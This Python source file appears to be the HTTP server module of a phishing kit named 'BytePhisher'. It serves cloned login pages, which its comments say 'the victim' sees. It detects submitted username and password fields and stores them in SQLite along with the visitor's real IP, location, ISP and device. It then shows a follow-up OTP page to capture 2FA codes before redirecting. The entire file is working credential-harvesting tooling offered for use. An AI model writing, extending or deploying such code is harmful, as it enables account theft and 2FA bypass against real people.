# BytePhisher — pure-Python threaded HTTP server with TLS option,
# full request logging, SQLite-backed capture, and Jinja2 template rendering.
#
# No PHP dependency. Runs on any Python 3.10+.

import http.server
import socketserver
import ssl
import os
import json
import re
from urllib.parse import parse_qs, urlparse
from . import capture as cap
from . import templates as tpl

def _extract_fields(post_body: str, ct: str) -> dict:
    """Parse application/x-www-form-urlencoded or multipart bodies into fields."""
    if "multipart/form-data" in ct:
        # crude multipart parser
        out = {}
        for chunk in re.split(r"\r\n\r\n", post_body):
            m = re.search(r'name="([^"]+)"', chunk)
            body_m = re.search(r'name="([^"]+)"\s*\r\n(.*?)$', chunk, re.S)
            if m and body_m:
                out[m.group(1)] = body_m.group(2).strip()
        return out
    return {k: v[0] for k, v in parse_qs(post_body).items()}

def _is_creds(d: dict) -> bool:
    keys = {k.lower() for k in d}
    has_user = any(x in keys for x in ("username","email","login","user","user_name","email_address","user_id","username_or_email","email_or_username","userid","user_name"))
    has_pass = any(x in keys for x in ("password","passw","pwd","password_confirm","passwd","pass_code","password_confirmation","pass"))
    return has_user and has_pass

def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False):
    class PhishHandler(http.server.BaseHTTPRequestHandler):
        db = cap.CaptureDB(db_path)
        redirect = redirect_url
        otp_page = otp

        def log_message(self, fmt, *args):
            pass  # silence default stderr logging; structured logs go to DB

        def _client_ip(self):
            """Real client IP: tunnel/edge headers win over the socket address,
            otherwise every hit behind cloudflared/ngrok looks like 127.0.0.1."""
            for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
                v = self.headers.get(h)
                if v:
                    return v.strip()
            xff = self.headers.get("X-Forwarded-For")
            if xff:
                return xff.split(",")[0].strip()
            return self.client_address[0]

        GEO_URLS = {
            # free, no-key endpoints; correct paths matter (a bare host 404s)
            "ipapi":  "https://ipapi.co/{ip}/json/",
            "ipinfo": "https://ipinfo.io/{ip}/json",
        }

        def _geo(self, ip):
            if geo_provider == "off" or not ip:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            tmpl = self.GEO_URLS.get(geo_provider)
            if not tmpl:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            try:
                import urllib.request
                req = urllib.request.Request(
                    tmpl.format(ip=ip),
                    headers={"User-Agent": "bytephisher/1.0", "Accept": "application/json"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    g = json.loads(r.read().decode("utf-8", "replace"))
                return {
                    "ip": ip,
                    "city": g.get("city") or "",
                    "country": (g.get("country_name") or g.get("country") or ""),
                    "isp": (g.get("org") or g.get("asn") or g.get("isp") or ""),
                }
            except Exception:
                return {"ip": ip, "city": "", "country": "", "isp": ""}

        def _device(self, ua: str):
            ua_l = ua.lower()
            if "iphone" in ua_l or "ipad" in ua_l:
                return "ios"
            if "android" in ua_l:
                return "android"
            if "mac" in ua_l:
                return "macos"
            if "win" in ua_l:
                return "windows"
            if "linux" in ua_l:
                return "linux"
            return "unknown"

        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
                return
            # page view -> visitor counter (creds come in via POST)
            try:
                self.db.log_visit(self._client_ip(), self.headers.get("User-Agent", ""))
            except Exception:
                pass
            # render template — OTP page only when explicitly requested (/otp),
            # otherwise the victim always sees the login page first
            site = self.server.current_site  # set externally
            if site and os.path.isdir(site):
                want_otp = self.otp_page and "otp" in self.path.lower()
                html = tpl.render_site(site, self.path, want_otp)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))
            else:
                self.send_error(404)

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", "replace")
            ct = (self.headers.get("Content-Type") or "").lower()
            fields = _extract_fields(body, ct)
            ip = self._client_ip()
            geo = self._geo(ip)
            ua = self.headers.get("User-Agent", "")
            dev = self._device(ua)
            creds = _is_creds(fields)
            has_otp = any(k.lower().startswith("otp") for k in fields)
            self.db.record(
                source_url=self.headers.get("Referer", self.path),
                ip=geo["ip"], city=geo["city"], country=geo["country"],
                isp=geo["isp"], ua=ua, device=dev,
                fields=fields, is_cred=creds
            )
            # 2FA flow: after the first credential submit, show the OTP page.
            if self.otp_page and creds and not has_otp:
                html = tpl.render_site(self.server.current_site, "/", True)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))
            elif self.redirect:
                self.send_response(302)
                self.send_header("Location", self.redirect)
                self.end_headers()
            else:
                html = tpl.render_thankyou()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))

    return PhishHandler

def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi",
            redirect_url="", otp=False, tls=False, cert_path=None):
    """Start the server; returns (httpd, handler_class)."""
    Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp)
    class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
    httpd = _ThreadingHTTPServer(("0.0.0.0", port), Handler)
    if tls and cert_path:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(cert_path, cert_path.replace("cert", "key"))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.current_site = site_folder
    return httpd, Handler
